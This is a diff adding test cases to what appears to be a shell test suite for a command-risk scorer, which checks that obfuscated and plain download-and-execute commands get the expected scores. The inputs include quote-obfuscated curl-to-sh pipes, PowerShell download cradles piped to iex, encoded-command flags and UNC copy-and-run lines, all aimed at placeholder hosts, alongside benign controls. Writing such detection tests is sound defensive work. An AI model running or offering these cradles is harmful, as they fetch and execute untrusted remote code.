@@ -829,6 +829,32 @@ jcheck "cred: login users benign" 'd["score"] == 0' paste "cat login users.txt"
 jcheck "cred: key4.txt benign" 'd["score"] == 0' paste "cat key4.txt"
 jcheck "cred: firefox.md benign" 'd["score"] == 0' paste "cat firefox.md"
 
+# Quote-insertion obfuscation + bare PS cradles + UNC copy + enc flags (cycle 496):
+# cmd/bash strip inline quotes before exec — matching runs on a quote-stripped copy
+jcheck "obf: quoted curl pipe == 40" 'd["score"] == 40' paste "\"curl\" http://e | sh"
+jcheck "obf: single-quoted curl pipe == 40" 'd["score"] == 40' paste "'curl' http://e | sh"
+jcheck "obf: c\"u\"rl pipe == 40" 'd["score"] == 40' paste 'c"u"rl http://e | sh'
+jcheck "obf: cu\"\"rl pipe == 40" 'd["score"] == 40' paste 'cu""rl http://e | sh'
+jcheck "ps: bare Invoke-WebRequest == 65" 'd["score"] == 65' paste "Invoke-WebRequest http://e/x -OutFile x && x"
+jcheck "ps: bare DownloadString|iex == 65" 'd["score"] == 65' paste "iex(New-Object Net.WebClient).DownloadString(\"http://e\")"
+jcheck "ps: bare DownloadString pipe iex == 65" 'd["score"] == 65' paste "(New-Object Net.WebClient).DownloadString(\"http://e\") | iex"
+jcheck "ps: Start-BitsTransfer == 65" 'd["score"] == 65' paste "Start-BitsTransfer -Source http://e/x -Destination x.exe && x.exe"
+jcheck "ps: -e enc flag == 65" 'd["score"] == 65' paste "powershell -e SGVsbG8="
+jcheck "ps: -ec flag == 65" 'd["score"] == 65' paste "powershell -ec SGVsbG8="
+jcheck "ps: pwsh -enc == 65" 'd["score"] == 65' paste "pwsh -enc SGVsbG8="
+jcheck "unc: xcopy share + exe exec == 45" 'd["score"] == 45' paste "xcopy \\\\e\\s\\x.exe %TEMP%\\ && x.exe"
+jcheck "unc: copy share + ps1 exec == 45" 'd["score"] == 45' paste "copy \\\\e\\s\\x.ps1 . ; x.ps1"
+jcheck "unc: bare robocopy LOLBin flag == 55" 'd["score"] == 55' paste "robocopy \\\\srv\\share dst"
+jcheck "ps: bare iwr+http == 65" 'd["score"] == 65' paste "iwr http://e/x -OutFile x"
+jcheck "ps: bare irm+iex cradle == 65" 'd["score"] == 65' paste "irm http://e/x.ps1 | iex"
+jcheck "ps: certutil verify benign" 'd["score"] == 0' paste "certutil -verify x.cer"
+jcheck "ps: Get-Process benign" 'd["score"] == 0' paste "powershell Get-Process"
+jcheck "obf: quoted word benign" 'd["score"] == 0' paste "a \"quoted\" word"
+jcheck "unc: bare xcopy benign" 'd["score"] == 0' paste "xcopy a b && dir"
+jcheck "obf: curl.exe pipe == 40" 'd["score"] == 40' paste "curl.exe http://e | sh"
+jcheck "unc: xcopy share + start exec == 45" 'd["score"] == 45' paste "xcopy \\\\e\\s\\x.exe %TEMP%\\ && start x"
+jcheck "ps: -ec flag == 65" 'd["score"] == 65' paste "powershell -ec SGVsbG8="
+
 # secret findings[] carry a 1-based line number (SIEM/remediation locus)
 printf 'l1\nl2\nl3\nAuthorization: Bearer abcdef1234567890abcdefghij\n' | jcheck "secret finding reports correct line number" "'\"line\":4' in s" secret --stdin
 jcheck "secret single-line input reports line 1" "'\"line\":1' in s" secret 'key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d'
